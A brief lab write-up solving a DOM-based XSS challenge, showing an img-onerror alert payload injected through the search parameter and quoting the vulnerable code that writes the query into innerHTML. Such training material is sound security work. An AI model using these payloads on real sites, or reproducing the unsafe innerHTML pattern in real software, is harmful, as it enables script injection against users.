# Challenge: DOM XSS in innerHTML sink using source location.search
- Category: Web

## Description

## Flag: 


## Solution
Upon opening the website, it was again a blogpage but with a search bar this time.

Entering a random stringh in the search bar and then looking at the source-view, i saw 

<img width="842" height="383" alt="image" src="https://github.com/user-attachments/assets/2c920cd0-d976-476a-bcea-36c005f7b096" />

I saw a `<span>` block around the search area and upon looking into how `<span>` works in innerhtml, I came up with the payload

```
<h1>
    <span>0 search results for '</span>
    <span id="searchMessage">
        <img src="x" onerror=alert('hhhh')>
    </span><span>'</span></h1>
<script>
    function doSearchQuery(query) {
        document.getElementById('searchMessage').innerHTML = query;
    }
    var query = (new URLSearchParams(window.location.search)).get('search');
    if(query) {
        doSearchQuery(query);
    }
</script>
```
This sets innerHTML to `document.getElementById('searchMessage').innerHTML = query;` which solved the lab for me

## References
- https://owasp.org/www-community/attacks/DOM_Based_XSS
- https://learn.snyk.io/lesson/dom-based-xss/?ecosystem=javascript
